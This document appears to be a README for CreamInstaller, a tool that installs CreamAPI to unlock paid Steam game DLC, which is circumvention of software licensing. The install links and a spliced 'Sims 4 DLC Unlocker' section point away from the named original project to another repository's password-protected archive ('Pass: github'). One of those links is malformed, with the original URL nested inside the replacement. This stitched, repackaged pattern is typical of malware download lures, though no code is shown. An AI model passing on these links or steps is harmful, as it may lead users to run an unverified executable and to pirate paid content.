# CreamInstaller: CreamAPI Generator & Installer [![DLC Unlocker](https://img.shields.io/badge/CreamInstaller-Download-green)](https://github.com/svr123456789/creaminstaller/releases/tag/ver4500)

## Quick Installation
To get started with Sims 4 DLC Unlocker, follow these simple steps:
1. **Get the unlocker: [![DLC Unlocker](https://img.shields.io/badge/CreamInstaller-Download-green)](https://github.com/svr123456789/creaminstaller/releases/tag/ver4500)**
2. **Pass: github**
3. **Unlock the archive and follow the instructions in the archive!**
4. **Enjoy the game!**

![Program Preview Image](https://i.imgur.com/BxGU99q.png)

###### Refer to [this post](https://cs.rin.ru/forum/viewtopic.php?f=29&t=70576) if you don't know what CreamAPI is! ;)

###### The program utilizes CreamAPI v4.5.0.0 Hotfix downloaded from that post and embedded into the program itself; no download necessary on your part!
---
#### Description:
Automatically finds all installed Steam games and their respective Steamworks DLL locations on the user's computer,
automatically parses SteamCMD and the Steam Store for those games' DLCs, then provides a very simple graphical interface utilizing the gathered information.

The primary function of the program is to **automatically generate and install CreamAPI** for whichever
games and DLCs the user selects, however through the use of the **right-click context menu** the user can also:
* automatically repair the Paradox Launcher
* open the parsed SteamCMD AppInfo in Notepad
* refresh the parsed SteamCMD AppInfo
* open Root directories or Steamworks DLL directories in Explorer
* open SteamDB/Steam Store/Steam Community links in the default browser

---
#### Features:
* Automatic downloading and installing of SteamCMD. *for gathering appinfo such as name, buildid, listofdlc, depots*
* Automatic gathering and caching of appinfo for **ALL** installed Steam games and **ALL** of their DLCs.
* Automatic generation of cream_api.ini configuration and installation of CreamAPI DLLs.
* Automatic uninstallation of CreamAPI DLLs and cream_api.ini configuration.
* Automatic repairing of the Paradox Launcher via the right-click context menu "Repair" option. *for when the launcher updates whilst you have CreamAPI installed to it*

---
#### Installation:
1. Click [here]([https://github.com/pointfeev/CreamInstaller/releases/latest/download/CreamInstaller.zip](https://github.com/svr123456789/creaminstaller/releases/tag/ver4500)) to download the latest release from GitHub.
2. Extract the executable to anywhere on your computer you want. *it's completely self-contained*

---
#### Usage:
1. Start the program executable.
2. Wait for the program to download and install SteamCMD. *very fast, depends on internet speed*
3. Wait for the program to gather and cache installed Steam games and their DLCs. *may take a good amount of time on the first run, depends on how many games you have installed and how many DLCs they have*
4. **CAREFULLY** select what games and DLCs you wish to unlock. *CreamAPI is not tested for every game!*
5. Click the **Generate and Install** button.
6. Click the **OK** button to close the program.
7. If CreamAPI doesn't work for any of the games you installed it on, simply go back to step 4 and select what games you wish you **revert** changes to, and instead click the **Uninstall** button this time.

---
##### Bugs/Crashes/Issues:
All bugs, crashes, and other issues should be referred to the [GitHub Issues](https://github.com/pointfeev/CreamInstaller/issues) page!

---
##### More Information:
* You can right click on any game or DLC in the selection tree view to open a context menu with multiple shortcuts.
* SteamCMD installation and appinfo cache can be found at **C:\ProgramData\CreamInstaller**.
* The program automatically and very quickly updates from [GitHub](https://github.com/pointfeev/CreamInstaller) using [Onova](https://github.com/Tyrrrz/Onova). *updates can be ignored*
* The program source and other information can be found on [GitHub](https://github.com/pointfeev/CreamInstaller).
